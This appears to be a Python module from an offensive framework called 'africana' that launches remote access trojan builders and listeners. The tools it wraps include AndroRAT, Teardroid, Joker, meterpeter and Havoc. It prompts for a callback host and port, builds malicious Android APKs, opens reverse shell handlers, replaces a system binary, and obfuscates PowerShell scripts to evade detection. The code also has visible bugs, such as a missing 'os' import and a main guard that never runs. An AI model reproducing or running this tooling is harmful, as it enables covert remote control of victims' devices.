import sys
import time
import socket
import subprocess
from src.core.banner import *
from src.core.bcolors import *

class generator(object):
    def __init__(self):
        pass
    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

    def shellz(self):
        os.system('clear')
        process = subprocess.Popen('cd src/externals/shells/; bash shells.py', shell = True).wait()
        return process

    def blackjack(self):
        lport = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lport" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "9999" + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (lport) == 0:
            lport = 9999
            time.sleep(0.9)
        process = subprocess.Popen('cd src/externals/blackjack/; python3 BlackJack.py -s -n {0}'.format(lport), shell = True).wait()
        return process

    def powerjoker(self):
        print("")
        subprocess.Popen('ip addr', shell = True).wait()
        lhost = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lhost" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "%s" %(rat.get_local_ip()) + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (lhost) == 0:
            lhost = str(rat.get_local_ip())
        lport = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lport" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "9999" + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (lport) == 0:
            lport = 9999
            time.sleep(0.9)
        os.system('clear')
        process = subprocess.Popen('cd src/externals/joker/; python3 joker.py -l {0} -p {1}'.format(lhost, lport), shell = True).wait()
        return process

    def meterpeter(self):
        os.system('clear')
        process = subprocess.Popen('cd src/externals/meterpeter/; pwsh meterpeter.ps1', shell = True).wait()
        return process

    def havoc(self):
        os.system('clear')
        process = subprocess.Popen('havoc client & havoc server -d -v', shell = True).wait()
        return process

    def teardroid(self):
        malware = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Output" + bcolors.ENDC + ":" + bcolors.BLUE + "Deafult" + bcolors.ENDC + ":" + bcolors.YELLOW + "africana.apk" + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (malware) == 0:
            malware = 'africana.apk'
        os.system('clear')
        process = subprocess.Popen('cd src/externals/Teardroid-phprat/; python3 Teardroid.py -b {0}'.format(malware), shell = True).wait()
        return process

    def androrat(self):
        try:
            if os.path.exists('/usr/bin/zipalign.bak_africana'):
                pass
            elif not os.path.exists('/usr/bin/zipalign.bak_africana'):
                try:
                    os.system('mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; cd src/externals/androrat; pkg -i zipalign_8.1.0.deb')
                except:
                    os.system('cd src/externals/androrat; pkg -i zipalign_8.1.0.deb')
                    pass
        except:
            pass
        print("")
        subprocess.Popen('ip addr', shell = True).wait()
        lhost = input(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lhost" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "%s" %(rat.get_local_ip()) + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (lhost) == 0:
            lhost = str(rat.get_local_ip())
        lport = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Lport" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "9999"+ bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (lport) == 0:
            lport = 9999
        malware = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Output" + bcolors.ENDC + ":" + bcolors.BLUE + "Default" + bcolors.ENDC + ":" + bcolors.YELLOW + "(africana.apk)" + bcolors.GREEN + ")# " + bcolors.ENDC)
        if len (malware) == 0:
            warn = bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Setting things up & Generating.." + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.YELLOW + "Android RAT" + bcolors.GREEN + ")#" + bcolors.ENDC
            for w in warn:
                sys.stdout.write(w)
                sys.stdout.flush()
                time.sleep(0.09)
            malware = 'africana'
        os.system('clear')
        process = subprocess.Popen('cd src/externals/androrat/; python3 androrat.py --build -i %s -p %s -o %s%s' %(lhost, lport, malware, ".apk"), shell = True).wait()
        process = subprocess.Popen('cd src/externals/androrat/; python3 androrat.py --shell -i %s -p %s' %(lhost, lport), shell = True).wait()
        return process

    def chameleon(self):
        script = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")" + bcolors.GREEN + "(" + bcolors.DARKCYAN + "Full path to your .Ps1" + bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.RED + "(Path = %s)" %(script) + bcolors.ENDC)
        output = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")" + bcolors.GREEN + "(" + bcolors.DARKCYAN + "Full path to save Output" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        subprocess.Popen('cd src/externals/chameleon; python3 chameleon.py -a -o %s %s' %(output, script), shell = True).wait()
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Africana Engine is Obfuscating your script " + bcolors.RED + "~> " + bcolors.BLUE + "]<~" + bcolors.ENDC)
        time.sleep(1.5)
        warn = bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Obfuscatin Done. Location" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.YELLOW + "%s" %(output) + bcolors.GREEN + ")#" + bcolors.ENDC
        for w in warn:
            sys.stdout.write(w)
            sys.stdout.flush()
            time.sleep(0.09)
        time.sleep(3)

    def chameleon_1(self):
        script = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")" + bcolors.GREEN + "(" + bcolors.DARKCYAN + "Full path to your .Ps1" + bcolors.GREEN + ")# " + bcolors.ENDC)
        print(bcolors.RED + "(Path = %s)" %(script) + bcolors.ENDC)
        output = input(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")" + bcolors.GREEN + "(" + bcolors.DARKCYAN + "Full path to save Output" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
        subprocess.Popen('cd src/externals/chameleon; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"' %(script, output), shell = True).wait()
        print(bcolors.BLUE + "~>[ " + bcolors.RED + "Africana Engine is Obfuscating your script " + bcolors.RED + "~> " + bcolors.BLUE + "]<~" + bcolors.ENDC)
        time.sleep(1.5)
        warn = bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Obfuscatin Done. Location" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.YELLOW + "%s" %(output) + bcolors.GREEN + ")#" + bcolors.ENDC
        for w in warn:
            sys.stdout.write(w)
            sys.stdout.flush()
            time.sleep(0.09)
        time.sleep(3)

rat = generator()

if ' __name__' == '__main__':
        sys.exit(rat())
